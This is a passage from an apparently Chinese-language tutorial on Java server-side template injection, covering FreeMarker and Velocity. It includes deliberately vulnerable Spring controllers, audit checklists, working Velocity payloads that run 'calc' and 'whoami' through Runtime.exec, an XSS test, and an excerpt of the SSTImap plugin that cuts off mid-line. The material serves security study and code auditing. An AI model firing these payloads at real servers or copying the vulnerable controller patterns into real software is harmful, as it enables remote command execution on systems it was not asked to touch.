+<p><img src="/mdimg/javassti/1766413452269-13af583b-7643-43c4-a7ca-1f45557b6085.png" srcset="/img/loading.gif" lazyload></p>
+<ul>
+<li><code>$&#123;1/0&#125;</code> 会抛出除零异常，可能在响应中暴露错误信息。</li>
+<li>结合 <code>?new()</code> 尝试构造恶意对象。</li>
+</ul>
+<p>布尔盲注测试</p>
+<p><img src="/mdimg/javassti/1766413591271-89013efc-60e7-48dc-96ca-eda44a87b678.png" srcset="/img/loading.gif" lazyload></p>
+<ul>
+<li><code>(1.0==1.0)</code> 为真 → <code>&#39;1&#39;</code> → <code>eval</code> 成功 → 不报错。</li>
+<li><code>(1.0==0.1)</code> 为假 → <code>&#39;0&#39;</code> → <code>1/0</code> → 报错。</li>
+<li>通过是否返回 500 错误判断布尔值。</li>
+</ul>
+<p>命令执行测试</p>
+<p><img src="/mdimg/javassti/1766414280808-20a7a2c0-af41-4034-b241-1bd807999e00.png" srcset="/img/loading.gif" lazyload></p>
+<ul>
+<li>通过字符串替换测试</li>
+</ul>
+<p>通过报错命令执行</p>
+<p><img src="/mdimg/javassti/1766414380444-88014492-d025-4d77-888d-0e13ee7c8d54.png" srcset="/img/loading.gif" lazyload></p>
+<p>各种payload，包括布尔盲注、时间盲注、写文件</p>
+<p><img src="/mdimg/javassti/1766414504560-8c5bd623-821a-4d20-b87a-a64b22ca570b.png" srcset="/img/loading.gif" lazyload></p>
+<p>上下文逃逸</p>
+<p><img src="/mdimg/javassti/1766414614188-7bb9074a-f417-4d1a-934a-9b1ffa0172ab.png" srcset="/img/loading.gif" lazyload></p>
+<p>这些定义了在不同模板上下文中如何“闭合”原有语法并注入恶意代码。例如：</p>
+<ul>
+<li>在 <code>&lt;#-- 用户输入 --&gt;</code> 中，可用 <code>--&gt; $&#123;malicious&#125; &lt;#--</code> 逃逸注释。</li>
+<li>在 <code>&lt;#if user_input&gt;</code> 中，需闭合 <code>if</code> 语句：<code>1&#125; &gt; $&#123;malicious&#125; &lt;#--</code>。</li>
+</ul>
+<h2 id="velocity"><a href="#velocity" class="headerlink" title="velocity"></a>velocity</h2><p><a target="_blank" rel="noopener" href="https://velocity.apache.org/">https://velocity.apache.org/</a></p>
+<h3 id="demo-1"><a href="#demo-1" class="headerlink" title="demo"></a>demo</h3><p>pom</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;properties&gt;<br>    &lt;java.version&gt;<span class="hljs-number">17</span>&lt;/java.version&gt;<br>&lt;/properties&gt;<br>&lt;dependencies&gt;<br><br>    &lt;dependency&gt;<br>        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;<br>        &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;<br>    &lt;/dependency&gt;<br><br>    &lt;dependency&gt;<br>        &lt;groupId&gt;org.apache.velocity&lt;/groupId&gt;<br>        &lt;artifactId&gt;velocity-engine-core&lt;/artifactId&gt;<br>        &lt;version&gt;<span class="hljs-number">2.4</span><span class="hljs-number">.1</span>&lt;/version&gt;<br>    &lt;/dependency&gt;<br><br>    &lt;dependency&gt;<br>        &lt;groupId&gt;javax.servlet&lt;/groupId&gt;<br>        &lt;artifactId&gt;servlet-api&lt;/artifactId&gt;<br>        &lt;version&gt;<span class="hljs-number">2.5</span>&lt;/version&gt;<br>    &lt;/dependency&gt;<br><br>&lt;/dependencies&gt;<br></code></pre></td></tr></table></figure>
+
+<p>VelocityConfig.java</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs plain">package org.example.ssti;<br><br>import org.apache.velocity.app.VelocityEngine;<br>import org.springframework.context.annotation.Bean;<br>import org.springframework.context.annotation.Configuration;<br>import java.util.Properties;<br><br>@Configuration<br>public class VelocityConfig &#123;<br><br>    @Bean<br>    public VelocityEngine velocityEngine() &#123;<br>        Properties props = new Properties();<br>        props.setProperty(&quot;resource.loader&quot;, &quot;class&quot;);<br>        props.setProperty(&quot;class.resource.loader.class&quot;,<br>                &quot;org.apache.velocity.runtime.resource.loader.ClasspathResourceLoader&quot;);<br>        props.setProperty(&quot;input.encoding&quot;, &quot;UTF-8&quot;);<br>        props.setProperty(&quot;output.encoding&quot;, &quot;UTF-8&quot;);<br>        props.setProperty(&quot;runtime.log.logsystem.class&quot;, &quot;org.apache.velocity.runtime.log.NullLogSystem&quot;);<br><br>        VelocityEngine velocityEngine = new VelocityEngine();<br>        velocityEngine.init(props);<br>        return velocityEngine;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>helloController.java</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs plain">package org.example.ssti.controller;<br><br>import org.apache.velocity.Template;<br>import org.apache.velocity.VelocityContext;<br>import org.apache.velocity.app.VelocityEngine;<br>import org.springframework.beans.factory.annotation.Autowired;<br>import org.springframework.stereotype.Controller;<br>import org.springframework.web.bind.annotation.GetMapping;<br>import org.springframework.web.bind.annotation.ResponseBody;<br><br>import java.io.StringWriter;<br><br><br>@Controller<br>public class helloController &#123;<br><br>    @Autowired<br>    private VelocityEngine velocityEngine;<br><br>    @GetMapping(&quot;/hello&quot;)<br>    @ResponseBody<br>    public String hello() &#123;<br>        VelocityContext context = new VelocityContext();<br>        context.put(&quot;name&quot;, &quot;World&quot;);<br>        context.put(&quot;time&quot;, new java.util.Date());<br><br>        Template template = velocityEngine.getTemplate(&quot;templates/hello.vm&quot;, &quot;UTF-8&quot;);<br>        StringWriter writer = new StringWriter();<br>        template.merge(context, writer);<br><br>        return writer.toString();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>hello.vm</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;!-- src/main/resources/templates/hello.vm --&gt;<br>&lt;html&gt;<br>&lt;head&gt;&lt;title&gt;Hello Velocity&lt;/title&gt;&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1&gt;Hello, $name!&lt;/h1&gt;<br>&lt;p&gt;Current time: $time&lt;/p&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/mdimg/javassti/1766397786445-4dbc5bb4-4a3e-45a5-a63a-6c78fc30406b.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="语法和指令"><a href="#语法和指令" class="headerlink" title="语法和指令"></a>语法和指令</h3><h4 id="xxx-xxx-变量引用"><a href="#xxx-xxx-变量引用" class="headerlink" title="$xxx/${xxx}变量引用"></a>$xxx/${xxx}变量引用</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">Hello, $name!<br>Welcome $&#123;user&#125;land!  ## 避免被解析为 $userland<br><span class="hljs-comment">//对象属性/方法</span><br>Name: $person.name<br>Age: $person.getAge()<br><br></code></pre></td></tr></table></figure>
+
+<h4 id="set-赋值"><a href="#set-赋值" class="headerlink" title="#set 赋值"></a>#set 赋值</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">#set($name = <span class="hljs-string">&quot;Tom&quot;</span>)<br>#set($total = $price * $quantity)<br>#set($list = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>])<br></code></pre></td></tr></table></figure>
+
+<h4 id="if-elseif-else：条件判断"><a href="#if-elseif-else：条件判断" class="headerlink" title="#if / #elseif / #else：条件判断"></a>#if / #elseif / #else：条件判断</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java">#<span class="hljs-keyword">if</span>($age &gt;= <span class="hljs-number">18</span>)<br>  成年人<br>#elseif($age &gt; <span class="hljs-number">12</span>)<br>  青少年<br>#<span class="hljs-keyword">else</span><br>  儿童<br>#end<br><br><span class="hljs-comment">//支持的比较操作符：</span><br>==, !=, &lt;, &lt;=, &gt;, &gt;=<br>也可用 &amp;&amp;, ||, !<br></code></pre></td></tr></table></figure>
+
+<h4 id="foreach：循环"><a href="#foreach：循环" class="headerlink" title="#foreach：循环"></a>#foreach：循环</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">#foreach($item in $items)<br>  - $item<br>#end<br><br><span class="hljs-comment">//获取索引（从 0 开始）：</span><br>#foreach($item in $items)<br>  $velocityCount. $item   ## $velocityCount 从 <span class="hljs-number">1</span> 开始<br>#end<br></code></pre></td></tr></table></figure>
+
+<h4 id="macro：定义宏（类似函数）"><a href="#macro：定义宏（类似函数）" class="headerlink" title="#macro：定义宏（类似函数）"></a>#macro：定义宏（类似函数）</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">#macro(greet $name)<br>  &lt;p&gt;Hello, $name!&lt;/p&gt;<br>#end<br><br>## 使用<br>#greet(<span class="hljs-string">&quot;Alice&quot;</span>)<br></code></pre></td></tr></table></figure>
+
+<h4 id="include-直接插入文件内容（不解析）"><a href="#include-直接插入文件内容（不解析）" class="headerlink" title="#include 直接插入文件内容（不解析）"></a>#include 直接插入文件内容（不解析）</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">#include(<span class="hljs-string">&quot;header.vm&quot;</span>)<br></code></pre></td></tr></table></figure>
+
+<h4 id="parse-插入模板解析"><a href="#parse-插入模板解析" class="headerlink" title="#parse 插入模板解析"></a>#parse 插入模板解析</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">#parse(<span class="hljs-string">&quot;footer.vm&quot;</span>)：插入并解析模板内容（可含 Velocity 语法）<br></code></pre></td></tr></table></figure>
+
+<h4 id="import-导入外部类"><a href="#import-导入外部类" class="headerlink" title="#import 导入外部类"></a>#import 导入外部类</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">#<span class="hljs-keyword">import</span>(<span class="hljs-string">&quot;com.example.MyClass&quot;</span>)<br><span class="hljs-comment">//使用#import语句可以导入外部Java类，以便在模板中使用其方法和属性。</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="stop：停止模板渲染（调试用）"><a href="#stop：停止模板渲染（调试用）" class="headerlink" title="#stop：停止模板渲染（调试用）"></a>#stop：停止模板渲染（调试用）</h4><h4 id="注释"><a href="#注释" class="headerlink" title="##注释"></a>##注释</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">## 单行注释<br><br>#*<br>  多行注释<br>  可以跨行<br>*#<br></code></pre></td></tr></table></figure>
+
+<h4 id="字符串拼接"><a href="#字符串拼接" class="headerlink" title="字符串拼接"></a>字符串拼接</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">#set($greeting = <span class="hljs-string">&quot;Hello, &quot;</span> + $name + <span class="hljs-string">&quot;!&quot;</span>)<br></code></pre></td></tr></table></figure>
+
+<h3 id="两个触发点"><a href="#两个触发点" class="headerlink" title="两个触发点"></a>两个触发点</h3><h4 id="evaluate"><a href="#evaluate" class="headerlink" title="evaluate"></a>evaluate</h4><p>攻击面：不预设模板而是直接将用户输入作为模板内容</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.ssti.controller;<br><br><span class="hljs-keyword">import</span> org.apache.velocity.VelocityContext;<br><span class="hljs-keyword">import</span> org.apache.velocity.app.VelocityEngine;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.GetMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestParam;<br><span class="hljs-keyword">import</span> java.io.StringWriter;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RestController;<br><br><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">evaluateController</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> VelocityEngine velocityEngine;<br>    <span class="hljs-keyword">public</span>  <span class="hljs-title function_">evaluateController</span><span class="hljs-params">(VelocityEngine velocityEngine)</span> &#123;<br>        <span class="hljs-built_in">this</span>.velocityEngine = velocityEngine;<br>    &#125;<br><br>    <span class="hljs-meta">@GetMapping(&quot;/evl&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">hello</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(defaultValue = &quot;World&quot;)</span> String name)</span> &#123;<br>        <span class="hljs-comment">// 直接将用户输入作为模板内容</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">templateStr</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Hello, &quot;</span> + name + <span class="hljs-string">&quot;!&quot;</span>;<br><br>        <span class="hljs-type">VelocityContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">VelocityContext</span>();<br>        <span class="hljs-type">StringWriter</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringWriter</span>();<br>        velocityEngine.evaluate(context, writer, <span class="hljs-string">&quot;SSTI Demo&quot;</span>, templateStr);<br><br>        <span class="hljs-keyword">return</span> writer.toString();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>代码审计重点：</p>
+<ul>
+<li>用户输入作为模板内容</li>
+<li>对用户输入调用了<code>.evaluate()</code></li>
+<li>版本&lt;=1.7</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">#set($e=<span class="hljs-string">&quot;e&quot;</span>)$e.getClass().forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>).invoke(<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>).exec(<span class="hljs-string">&quot;calc&quot;</span>)<br></code></pre></td></tr></table></figure>
+
+<p><img src="/mdimg/javassti/1766467838756-0e1de125-030b-4309-8455-a8bd5afa523a.png" srcset="/img/loading.gif" lazyload></p>
+<p>同时也存在xss</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;script&gt;alert(<span class="hljs-string">&#x27;XSS&#x27;</span>)&lt;/script&gt;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/mdimg/javassti/1766468083842-073b87b3-4907-4b68-bfe9-c51102b824a5.png" srcset="/img/loading.gif" lazyload></p>
+<h4 id="merge"><a href="#merge" class="headerlink" title="merge"></a>merge</h4><p>实际上并不是merge造成的漏洞，根源在于不安全的设计让其模板文件名可控，导致可以执行任意模板</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs plain">package org.example.ssti.controller;<br><br>import org.apache.velocity.Template;<br>import org.apache.velocity.VelocityContext;<br>import org.apache.velocity.app.VelocityEngine;<br>import org.springframework.web.bind.annotation.GetMapping;<br>import org.springframework.web.bind.annotation.RequestParam;<br>import java.io.StringWriter;<br>import org.springframework.web.bind.annotation.RestController;<br><br>@RestController<br>public class evaluateController &#123;<br>    private final VelocityEngine velocityEngine;<br>    public  evaluateController(VelocityEngine velocityEngine) &#123;<br>        this.velocityEngine = velocityEngine;<br>    &#125;<br><br>    @GetMapping(&quot;/evl&quot;)<br>    public String hello(@RequestParam String name) &#123;<br>        // 获取用户输入的模板文件<br>        Template tpl = velocityEngine.getTemplate(name,&quot;UTF-8&quot;);<br>        VelocityContext context = new VelocityContext();<br>        context.put(&quot;name&quot;,&quot;admin&quot;);<br>        StringWriter writer = new StringWriter();<br>        tpl.merge(context,writer);   //合并模板<br>        return writer.toString();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>审计重点：</p>
+<ul>
+<li>能够上传文件（要保证上传后内容字符一致）</li>
+<li>调用了<code>velocityEngine.getTemplate().merge()</code>,并且模板文件名可控</li>
+</ul>
+<p><img src="/mdimg/javassti/1766470083626-489d9f1c-b5a9-4ae1-b69f-f9b166d027d0.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/mdimg/javassti/1766470054441-2b0ff283-7d89-4dde-b35b-48b202b22460.png" srcset="/img/loading.gif" lazyload></p>
+<p>回显payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plain">#set($x=&#x27;&#x27;)<br>#set($rt=$x.class.forName(&#x27;java.lang.Runtime&#x27;))<br>#set($chr=$x.class.forName(&#x27;java.lang.Character&#x27;))<br>#set($str=$x.class.forName(&#x27;java.lang.String&#x27;))<br>#set($ex=$rt.getRuntime().exec(&#x27;whoami&#x27;))<br>$ex.waitFor()<br>#set($out=$ex.getInputStream())<br>#foreach($i in [1..$out.available()])<br>$str.valueOf($chr.toChars($out.read()))<br>#end<br></code></pre></td></tr></table></figure>
+
+<p><img src="/mdimg/javassti/1766470302960-b772b8d6-a827-43f4-ac64-b0ad0cf9b97f.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="sstimap-1"><a href="#sstimap-1" class="headerlink" title="sstimap"></a>sstimap</h3><p>plugins\java\velocity.py</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> plugins.languages <span class="hljs-keyword">import</span> java<br><span class="hljs-keyword">from</span> utils <span class="hljs-keyword">import</span> rand<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Velocity</span>(java.Java):<br>    priority = <span class="hljs-number">5</span><br>    plugin_info = &#123;<br>        <span class="hljs-string">&quot;Description&quot;</span>: <span class="hljs-string">&quot;&quot;&quot;Apache Velocity template engine&quot;&quot;&quot;</span>,<br>        <span class="hljs-string">&quot;Authors&quot;</span>: [<br>            <span class="hljs-string">&quot;Henshin @henshin https://github.com/henshin&quot;</span>,  <span class="hljs-comment"># Original payload for Tplmap</span><br>            <span class="hljs-string">&quot;Emilio @epinna https://github.com/epinna&quot;</span>,  <span class="hljs-comment"># Original Tplmap payload</span><br>            <span class="hljs-string">&quot;Vladislav Korchagin @vladko312 https://github.com/vladko312&quot;</span>,  <span class="hljs-comment"># Updates for SSTImap</span><br>        ],<br>        <span class="hljs-string">&quot;Engine&quot;</span>: [<br>            <span class="hljs-string">&quot;Homepage: https://velocity.apache.org/index.html&quot;</span>,<br>            <span class="hljs-string">&quot;Github: https://github.com/apache/velocity-engine&quot;</span>,<br>        ],<br>    &#125;<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">init</span>(<span class="hljs-params">self</span>):<br>        self.update_actions(&#123;<br>            <span class="hljs-string">&#x27;render&#x27;</span>: &#123;<br>                <span class="hljs-string">&#x27;render&#x27;</span>: <span class="hljs-string">&#x27;&#123;code&#125;&#x27;</span>,<br>                <span class="hljs-string">&#x27;header&#x27;</span>: <span class="hljs-string">&#x27;#set($h=&#123;header[0]&#125;+&#123;header[1]&#125;)$&#123;&#123;h&#125;&#125;&#x27;</span>,<br>                <span class="hljs-string">&#x27;trailer&#x27;</span>: <span class="hljs-string">&#x27;#set($t=&#123;trailer[0]&#125;+&#123;trailer[1]&#125;)$&#123;&#123;t&#125;&#125;&#x27;</span>,<br>                <span class="hljs-string">&#x27;test_render&#x27;</span>: <span class="hljs-string">f&#x27;#set($c=<span class="hljs-subst">&#123;rand.randints[<span class="hljs-number">0</span>]&#125;</span>*<span class="hljs-subst">&#123;rand.randints[<span class="hljs-number">1</span>]&#125;</span>)$&#123;&#123;c&#125;&#125;&#x27;</span>,<br>                <span class="hljs-string">&#x27;test_render_expected&#x27;</span>: <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;rand.randints[<span class="hljs-number">0</span>]*rand.randints[<span class="hljs-number">1</span>]&#125;</span>&#x27;</span><br>            &#125;,<br>            <span class="hljs-string">&#x27;render_error&#x27;</span>: &#123;<br>                <span class="hljs-string">&#x27;render&#x27;</span>: <span class="hljs-string">&#x27;&#123;code&#125;&#x27;</span>,<br>                <span class="hljs-string">&#x27;header&#x27;</span>: <span class="hljs-string">&#x27;#set($h=&#123;header[0]&#125;+&#123;header[1]&#125;)&#x27;</span>,<br>                <span class="hljs-comment"># Body needs to set b as the output</span><br>                <span class="hljs-string">&#x27;trailer&#x27;</span>: <span class="hljs-string">&#x27;#set($t=&#123;trailer[0]&#125;+&#123;trailer[1]&#125;)#set($r=(&quot;Y:/A:/&quot;+$h+$b+$t))#include($r)&#x27;</span>,<br>                <span class="hljs-string">&#x27;test_render&#x27;</span>: <span class="hljs-string">f&#x27;#set($b=<span class="hljs-subst">&#123;rand.randints[<span class="hljs-number">0</span>]&#125;</span>*<span class="hljs-subst">&#123;rand.randints[<span class="hljs-number">1</span>]&#125;</span>)&#x27;</span>,<br>                <span class="hljs-string">&#x27;test_render_expected&#x27;</span>: <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;rand.randints[<span class="hljs-number">0</span>]*rand.randints[<span class="hljs-number">1</span>]&#125;</span>&#x27;</span><br>            &#125;,<br>            <span class="hljs-string">&#x27;boolean&#x27;</span>: &#123;<br>                <span class="hljs-string">&#x27;call&#x27;</span>: <span class="hljs-string">&#x27;inject&#x27;</span>,<br>                <span class="hljs-string">&#x27;test_bool_true&#x27;</span>:  <span class="hljs-string">&#x27;#if(false)#include(&quot;Y:/A:/true&quot;)#end&#x27;</span>,<br>                <span class="hljs-string">&#x27;test_bool_false&#x27;</span>: <span class="hljs-string">&#x27;#if(true)#include(&quot;Y:/A:/false&quot;)#end&#x27;</span>,<br>                <span class="hljs-string">&#x27;verify_bool_true&#x27;</span>:  <span 